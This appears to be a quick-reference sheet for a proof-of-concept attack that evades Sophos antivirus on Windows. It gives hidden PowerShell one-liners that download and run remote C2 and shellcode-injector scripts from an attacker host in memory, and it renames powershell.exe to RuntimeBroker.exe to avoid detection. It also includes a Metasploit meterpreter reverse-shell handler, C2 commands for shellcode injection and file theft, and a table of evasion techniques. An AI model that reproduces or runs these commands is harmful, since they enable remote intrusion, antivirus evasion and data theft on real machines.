# ============================================================================
#                    QUICK REFERENCE - SOPHOS BYPASS POC
# ============================================================================

## 🚀 QUICK START (1-Liner)

### On Target Windows Machine (with Sophos):
```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
```

### Renamed PowerShell (Better Evasion):
```powershell
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\RuntimeBroker.exe -Force; & $env:TEMP\RuntimeBroker.exe -w hidden -ep bypass -nop -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/enhanced_agent_fastapi.ps1'))"
```

---

## 🖥️ ATTACKER SETUP

### Terminal 1: C2 Server
```bash
cd /Users/cyberxor/cyber_c2
python3 main.py
# Open http://localhost:8000 in browser
```

### Terminal 2: File Server
```bash
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 -m http.server 9000
```

### Terminal 3: Metasploit Handler
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.179; set LPORT 4444; exploit -j"
```

---

## 📋 BITS C2 COMMANDS

| Command | Description |
|---------|-------------|
| `ps` | List all running processes |
| `whoami` | Show current user |
| `ipconfig` | Network configuration |
| `dir C:\Users` | List directory |
| `inject <pid> <b64sc>` | Inject shellcode into process |
| `download <path>` | Download file from target |
| `upload <path> <b64>` | Upload file to target |

---

## 💉 SYSCALL INJECTION (via BITS Terminal)

```powershell
Copy-Item C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\RuntimeBroker.exe -Force; & $env:TEMP\RuntimeBroker.exe -nop -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.179:9000/syscall_v3.ps1'))"
```

---

## 🎯 GOOD INJECTION TARGETS

| Process | PID | Notes |
|---------|-----|-------|
| explorer.exe | varies | Always running, user-owned ✓ |
| OneDrive.exe | varies | User process ✓ |
| notepad.exe | varies | Start manually ✓ |

---

## ❌ AVOID THESE TARGETS

- **Sophos processes** (SophosFileScanner, etc.) - Protected
- **System processes** (csrss, smss, lsass) - Need SYSTEM
- **AV/EDR processes** - Protected

---

## 📁 FILES

| File | Purpose |
|------|---------|
| `enhanced_agent_fastapi.ps1` | BITS C2 Agent |
| `syscall_v3.ps1` | NTDLL Syscall Injector |
| `shellcode.txt` | Meterpreter payload (base64) |
| `POC_DOCUMENTATION.md` | Full documentation |

---

## 🔑 KEY TECHNIQUES

1. **HTTP C2** - Uses Invoke-RestMethod (no raw sockets)
2. **Renamed PowerShell** - Evades process name monitoring
3. **Direct NTDLL Syscalls** - Bypasses userland API hooks
4. **Process Injection** - Run shellcode in trusted process
5. **Fileless Execution** - IEX downloads and runs in memory

---

## 🛡️ WHY IT BYPASSES SOPHOS

| Technique | What Sophos Monitors | How We Bypass |
|-----------|---------------------|---------------|
| Network | Raw sockets | HTTP via WinHTTP |
| Process | powershell.exe | Renamed binary |
| API Hooks | kernel32.dll | Direct NTDLL |
| Files | Disk writes | Memory-only (IEX) |
| Behavior | Suspicious activity | Inject into explorer |

---

**IP Configuration:**
- Attacker (Mac): 192.168.1.179
- Target (Windows): 192.168.1.137
- C2 Port: 8000
- File Server: 9000
- MSF Listener: 4444
